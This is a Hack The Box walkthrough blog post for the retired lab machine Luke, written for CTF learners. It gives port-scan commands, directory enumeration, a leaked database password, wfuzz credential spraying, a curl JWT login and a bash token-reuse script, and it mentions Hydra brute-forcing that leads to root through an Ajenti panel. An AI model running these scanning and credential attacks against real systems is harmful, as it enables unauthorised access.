---
layout: post
title: "Luke: Hack The Box Walkthrough"
date: 2019-09-14 17:20:14 +0000
last_modified_at: 2019-09-14 17:20:14 +0000
category: Walkthrough
tags: ["Hack The Box", Luke, retired]
comments: true
image:
  feature: luke-htb-walkthrough.jpg
  credit: novelrobinson / Pixabay
  creditlink: https://pixabay.com/photos/temptation-fight-surrounded-513494/
---

This post documents the complete walkthrough of Luke, a retired vulnerable [VM][1] created by [H4d3s][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## Background

Luke is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.137 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-01 08:59:38 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8000/tcp on 10.10.10.137                                  
Discovered open port 3000/tcp on 10.10.10.137                                  
Discovered open port 22/tcp on 10.10.10.137                                    
Discovered open port 21/tcp on 10.10.10.137                                    
Discovered open port 80/tcp on 10.10.10.137
```

`masscan` finds several open ports. Let's do one better with `nmap` scanning the discovered ports to establish the services.

```
# nmap -n -v -Pn -p21,22,80,3000,8000 -A --reason -oN nmap.txt 10.10.10.137
...
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 63 vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14 12:35 webapp
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.174
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?    syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    syn-ack ttl 63 Ajenti http control panel
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Ajenti
```

It appears to be a FreeBSD box. Interesting. There's anonymous FTP, along with Node.js Express Framework (`3000/tcp`), Apache HTTP Server (`80/tcp`) and Ajenti Server Admin Panel (`8000/tcp`).

### Anonymous FTP

There's only one directory `webapp` and one file `for_Chihiro.txt`. Here's what the file says. Not too sure what it means though for now.

```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies !

Derry
```

### HTTP Service

Here's how the `http` service looks like.

<a class="image-popup">
![22012944.png](/assets/images/posts/luke-htb-walkthrough/22012944.png)
</a>

#### Directory/File Enumeration

Let's check the site out with `dirbuster`.

```
Dir found: / - 200
Dir found: /css/ - 200
Dir found: /js/ - 200
Dir found: /management/ - 401
Dir found: /member/ - 200
Dir found: /vendor/ - 200
Dir found: /vendor/bootstrap/ - 200
Dir found: /vendor/bootstrap/css/ - 200
Dir found: /vendor/bootstrap/js/ - 200
Dir found: /vendor/jquery/ - 200
Dir found: /vendor/jquery-easing/ - 200
File found: /config.php - 200
File found: /css/bootstrap.min.css - 200
File found: /css/scrolling-nav.css - 200
File found: /css/signin.css - 200
File found: /js/scrolling-nav.js - 200
File found: /login.php - 200
```

`login.php` and `config.php` sure look interesting.

_`login.php`_

<a class="image-popup">
![80aa07ca.png](/assets/images/posts/luke-htb-walkthrough/80aa07ca.png)
</a>

_`config.php`_

<a class="image-popup">
![227ab12d.png](/assets/images/posts/luke-htb-walkthrough/227ab12d.png)
</a>

Not too shabby. We got credentials (`root:Zk6heYCyv6ZE9Xcg`) for the database. We also got a directory `/management` protected by Basic authentication.

<a class="image-popup">
![3ab6bf88.png](/assets/images/posts/luke-htb-walkthrough/3ab6bf88.png)
</a>

### Node.js Express Framework

There's Node.js Express Framework at `3000/tcp`.

<a class="image-popup">
![fb72caea.png](/assets/images/posts/luke-htb-walkthrough/fb72caea.png)
</a>

There are two interesting endpoints: `login` and `users`, found through directory enumeration.

_`login`_

<a class="image-popup">
![2962cad1.png](/assets/images/posts/luke-htb-walkthrough/2962cad1.png)
</a>

_`users`_

<a class="image-popup">
![88ce89ac.png](/assets/images/posts/luke-htb-walkthrough/88ce89ac.png)
</a>

Now that we got `Zk6heYCyv6ZE9Xcg` as password, let's use `wfuzz` as a cracker of sorts and see if we can proceed further with `3000/tcp`.

```
# wfuzz -w users.txt -d '{"username":"FUZZ","password":"Zk6heYCyv6ZE9Xcg"}' -H "Content-Type: application/json" http://luke:3000/login                                       
********************************************************
* Wfuzz 2.2.1 - The Web Fuzzer                           *
********************************************************

Target: HTTP://luke:3000/login
Total requests: 8

==================================================================
ID      Response   Lines      Word         Chars          Request
==================================================================

00007:  C=403      0 L         1 W            9 Ch        "administrator"
00008:  C=403      0 L         1 W            9 Ch        "root"
00001:  C=403      0 L         1 W            9 Ch        "chihiro"
00002:  C=403      0 L         1 W            9 Ch        "Chihiro"
00003:  C=403      0 L         1 W            9 Ch        "derry"
00004:  C=403      0 L         1 W            9 Ch        "Derry"
00005:  C=200      0 L         2 W          219 Ch        "admin"
00006:  C=403      0 L         1 W            9 Ch        "guest"

Total time: 0.612439
Processed Requests: 8
Filtered Requests: 0
Requests/sec.: 13.06250
```

Awesome. We have a hit with `admin` as the username.

```
# curl -i -d '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' -H "Content-Type: application/json" http://luke:3000/login
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 219
ETag: W/"db-1BiQjPHn0LbIIGnMLSY47tA3+6c"
Date: Sun, 02 Jun 2019 09:05:54 GMT
Connection: keep-alive

{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5NDY2MzU0LCJleHAiOjE1NTk1NTI3NTR9.VKf4PAy6kRXwCYUVUoat4Heq0FRlcG3Bw2_oiL_067A"}
```

Looks like JWT has something to do with it. Armed with this insight, I wrote a simple `bash` script to test the endpoints.

<div class="filename"><span>test.sh</span></div>

```bash
#!/bin/bash

USER=admin
PASS=Zk6heYCyv6ZE9Xcg
HOST=luke
PORT=3000
WHAT=$1

TOKEN=$(curl -s \
             -d "{\"username\":\"$USER\",\"password\":\"$PASS\"}" \
             -H "Content-Type: application/json" \
             http://$HOST:$PORT/login \
        | jq . \
        | grep token \
        | cut -d':' -f2 \
        | tr -d ' "')

curl -s \
     -H "Authorization: Bearer $TOKEN" \
     "http://$HOST:$PORT/$WHAT" \
| jq .
```

Running `test.sh` without argument yields a welcome message.

<a class="image-popup">
![3d096d5d.png](/assets/images/posts/luke-htb-walkthrough/3d096d5d.png)
</a>

Running `test.sh` with `users` yields the users and their roles.

<a class="image-popup">
![5e1f8108.png](/assets/images/posts/luke-htb-walkthrough/5e1f8108.png)
</a>

Taking it up a notch reveals some very interesting results.

_./test.sh users/admin_

<a class="image-popup">
![8ed8e4c9.png](/assets/images/posts/luke-htb-walkthrough/8ed8e4c9.png)
</a>

_./test.sh users/derry_

<a class="image-popup">
![a6d3a637.png](/assets/images/posts/luke-htb-walkthrough/a6d3a637.png)
</a>

_./test.sh users/yuri_

<a class="image-popup">
![d698ddcd.png](/assets/images/posts/luke-htb-walkthrough/d698ddcd.png)
</a>

_./test.sh users/dory_

<a class="image-popup">
![f8e407f0.png](/assets/images/posts/luke-htb-walkthrough/f8e407f0.png)
</a>

Let's consolidate these usersnames and passwords, and feed them to Hydra just to see what gives.

<a class="image-popup">
![53a38b19.png](/assets/images/posts/luke-htb-walkthrough/53a38b19.png)
</a>

Damn. That was easy. :laughing: Let's check it out.

<a class="image-popup">
![e1fc465f.png](/assets/images/posts/luke-htb-walkthrough/e1fc465f.png)
</a>

Well well, what have we here?

<a class="image-popup">
![949ebead.png](/assets/images/posts/luke-htb-walkthrough/949ebead.png)
</a>

Looks like we have the `root` password to the Ajenti Control Panel. :triumph:

### Ajenti Server Admin Panel

Last but not least, it appears that we have an Ajenti installation at `8000/tcp` as well.

<a class="image-popup">
![19f6c925.png](/assets/images/posts/luke-htb-walkthrough/19f6c925.png)
</a>

Time to check out those Ajenti credentials we got earlier on!

<a class="image-popup">
![96fb537b.png](/assets/images/posts/luke-htb-walkthrough/96fb537b.png)
</a>

Boom. We are in the endgame now.

## Privilege Escalation

We can easily open a terminal as `root` to capture both `user.txt` and `root.txt`.

_`user.txt`_

<a class="image-popup">
![9c8911ca.png](/assets/images/posts/luke-htb-walkthrough/9c8911ca.png)
</a>

_`root.txt`_

<a class="image-popup">
![c241a01a.png](/assets/images/posts/luke-htb-walkthrough/c241a01a.png)
</a>

Easy peasy lemon squeezy.

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/190
[2]: https://www.hackthebox.eu/home/users/profile/564
[3]: https://www.hackthebox.eu/
